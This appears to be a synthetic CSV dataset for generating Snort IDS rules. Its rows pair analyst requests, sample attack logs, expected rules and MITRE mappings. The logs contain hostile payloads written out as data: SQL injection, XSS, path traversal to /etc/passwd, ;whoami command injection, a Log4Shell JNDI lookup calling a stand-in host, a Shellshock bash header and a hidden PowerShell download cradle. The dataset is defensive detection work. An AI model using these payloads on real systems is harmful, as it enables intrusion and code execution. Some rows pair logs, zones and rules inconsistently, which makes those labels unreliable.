doc_id,attack_description,description_style,attack_family,attack_type,protocol,source_zone,destination_zone,source_port,destination_port,service,payload_pattern,log_excerpt,expected_snort_rule,rule_explanation,severity,false_positive_risk,mitre_technique,keywords,synthetic_generation_method,needs_retrieval
SNORT_0103,Rule for tcp syn port scan on the network.,short,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,25,SMTP,many connection attempts,src=203.0.113.176 dst=10.0.1.19 proto=TCP dpt=25 flags=S count=34 window=1024,"alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:""Possible TCP SYN scan against SMTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000103; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 25 (SMTP) and uses indicators such as many connection attempts. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0104,Need IDS detection logic for ICMP Ping Sweep: Detect an ICMP ping sweep where one source probes many internal hosts. Include protocol and threshold constraints.,technical,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,many hosts,src=203.0.113.224 dst=10.0.7.0/24 proto=ICMP type=8 count=52,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as many hosts. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0105,Need IDS detection logic for TCP SYN Flood: Detect a TCP SYN flood targeting the HTTP service on port 80. Include protocol and threshold constraints.,technical,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,half-open,Netflow anomaly: high half-open TCP SYN rate to 10.0.2.31:80,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN flood against HTTP""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000105; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as half-open. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0106,Rule for udp flood on the network.,short,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,123,NTP,many sources,Collector: UDP packets to 10.0.4.157:123 exceed baseline by 800%,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000106; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 123 (NTP) and uses indicators such as many sources. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0107,Identify malicious HTTP traffic with UNION SELECT payloads against HTTP-alt.,formal,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,sqlmap,"GET /product?id=1 UNION SELECT username,password FROM users HTTP/1.1 host=shop.local","alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000107; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as sqlmap. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0108,"As a security analyst, I want to detect this behavior: Create a rule for HTTP URI containing encoded or clear script payloads.",analyst_request,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,onerror=,HTTP request uri=/comment?msg=%3Cscript%3Ealert(1)%3C/script%3E src=198.51.100.111,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000108; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as onerror=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0109,"As a security analyst, I want to detect this behavior: Detect directory traversal attempts using ../ sequences in HTTP URI.",analyst_request,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,..%2f,GET /download?file=../../../../etc/passwd HTTP/1.1 host=app.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000109; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as ..%2f. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0110,Identify HTTP command injection payloads against HTTP-alt.,formal,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,|whoami,GET /ping?host=127.0.0.1;whoami HTTP/1.1 src=198.51.100.98,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000110; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as |whoami. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0111,"As a security analyst, I want to detect this behavior: Detect repeated SSH connection attempts that may indicate brute force.",analyst_request,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,auth failure,tcp flow src=198.51.100.13 dst=10.0.5.219:22 sessions=25 in 60s,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000111; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as auth failure. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0112,SOC ticket: suspicious Brute_Force activity observed. Detect repeated FTP USER commands that may indicate brute force.,incident_ticket,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,PASS,FTP control channel contains repeated USER commands from 198.51.100.172,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000112; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as PASS. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0113,SOC ticket: suspicious Malware_C2 activity observed. Detect periodic HTTP beaconing using an old suspicious User-Agent header.,incident_ticket,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,8080,HTTP-alt,User-Agent,HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.135 dst=198.51.100.197,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000113; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as User-Agent. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0114,"As a security analyst, I want to detect this behavior: Identify malware staging using powershell and DownloadString keywords.",analyst_request,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,Invoke-Expression,HTTP payload contains powershell DownloadString from 10.0.7.113 to 203.0.113.129,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000114; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as Invoke-Expression. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0115,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints.,technical,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,TXT query,DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as TXT query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0116,"As a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY.",analyst_request,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,large response,UDP/53 ANY requests from one source exceed threshold,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000116; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as large response. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0117,SOC ticket: suspicious Exploitation activity observed. Detect Log4Shell exploitation attempts containing JNDI lookup strings.,incident_ticket,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,ldap://,GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000117; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as ldap://. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0118,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",analyst_request,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,/bin/bash,HTTP header contains Bash function pattern targeting /cgi-bin/status,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as /bin/bash. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0119,Need IDS detection logic for Cleartext Password Exposure: Detect possible cleartext password exposure in unencrypted traffic. Include protocol and threshold constraints.,technical,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,21,FTP,password=,FTP command PASS ******** observed from 10.0.9.144 to server,"alert tcp $HOME_NET any -> $EXTERNAL_NET 21 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000119; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as password=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
SNORT_0120,SOC ticket: suspicious Reconnaissance activity observed. Generate a Snort rule for reconnaissance traffic targeting FTP with SYN flags.,incident_ticket,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,flags:S,IDS flow: repeated SYN packets from 198.51.100.212 to 10.0.2.6:21 in 10 seconds,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible TCP SYN scan against FTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000120; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as flags:S. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0121,SOC ticket: suspicious Reconnaissance activity observed. Detect an ICMP ping sweep where one source probes many internal hosts.,incident_ticket,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,many hosts,src=203.0.113.88 dst=10.0.171.0/24 proto=ICMP type=8 count=52,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000121; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as many hosts. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0122,"As a security analyst, I want to detect this behavior: Generate a rule for abnormal SYN volume against a public HTTPS server.",analyst_request,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,half-open,Netflow anomaly: high half-open TCP SYN rate to 10.0.2.192:443,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000122; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as half-open. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0123,SOC ticket: suspicious DoS_DDoS activity observed. Create a Snort rule for excessive UDP packets sent to SSDP.,incident_ticket,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,1900,SSDP,high udp rate,Collector: UDP packets to 10.0.4.66:1900 exceed baseline by 800%,"alert udp $EXTERNAL_NET any -> $HOME_NET 1900 (msg:""Possible UDP flood on SSDP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000123; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 1900 (SSDP) and uses indicators such as high udp rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0124,Need IDS detection logic for SQL Injection: Identify malicious HTTP traffic with UNION SELECT payloads against HTTP. Include protocol and threshold constraints.,technical,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,sqlmap,HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.40,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000124; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as sqlmap. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0125,Need IDS detection logic for Cross Site Scripting: Detect reflected XSS attempts containing script tags in HTTP requests. Include protocol and threshold constraints.,technical,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,javascript:,GET /search?q=<script>alert(1)</script> HTTP/1.1 host=portal.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000125; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as javascript:. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0126,"As a security analyst, I want to detect this behavior: Identify web requests trying to access parent directories.",analyst_request,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,../,HTTP URI contains /static/..%2f..%2fetc%2fpasswd from 203.0.113.35,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000126; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as ../. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0127,Rule for command injection on the network.,short,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,&& id,GET /ping?host=127.0.0.1;whoami HTTP/1.1 src=198.51.100.87,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000127; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as && id. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0128,Generate a rule for excessive SSH login attempts from the same source.,formal,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,repeated attempts,sshd: Failed password for invalid user admin from 203.0.113.151 port 51422 repeated=18,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000128; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as repeated attempts. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0129,SOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,incident_ticket,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,failed login,ftp auth failed user=admin src=203.0.113.233 dst=10.0.5.5 attempts=31,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as failed login. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0130,SOC ticket: suspicious Malware_C2 activity observed. Generate a rule for possible malware C2 HTTP beacon traffic.,incident_ticket,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,beacon,Proxy log: repeated small HTTP requests with fixed interval from host 10.0.6.49,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000130; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as beacon. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0131,Create a rule for suspicious PowerShell download cradle content.,formal,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,powershell,POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.127,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000131; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as powershell. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0132,Need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,technical,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,long domain,Resolver log: many long subdomain TXT queries from host 10.0.8.65,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000132; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as long domain. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0133,"As a security analyst, I want to detect this behavior: Identify suspicious high-rate DNS ANY requests.",analyst_request,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,large response,DNS query type=ANY domain=example.org src=203.0.113.208 count=89,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000133; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as large response. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0134,Rule for log4shell jndi pattern on the network.,short,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,8443,HTTPS-alt,rmi://,HTTP header X-Api-Version contains ${jndi:ldap://203.0.113.88/x},"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000134; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 8443 (HTTPS-alt) and uses indicators such as rmi://. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0135,Identify HTTP requests containing the Shellshock () { pattern.,formal,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,:;};,User-Agent: () { :;}; /bin/bash -c 'id' src=198.51.100.170,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000135; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as :;};. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0136,Need IDS detection logic for Cleartext Password Exposure: Detect possible cleartext password exposure in unencrypted traffic. Include protocol and threshold constraints.,technical,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,80,HTTP,password=,POST /login body=username=alice&password=Summer2026 src=10.0.9.21,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000136; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as password=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
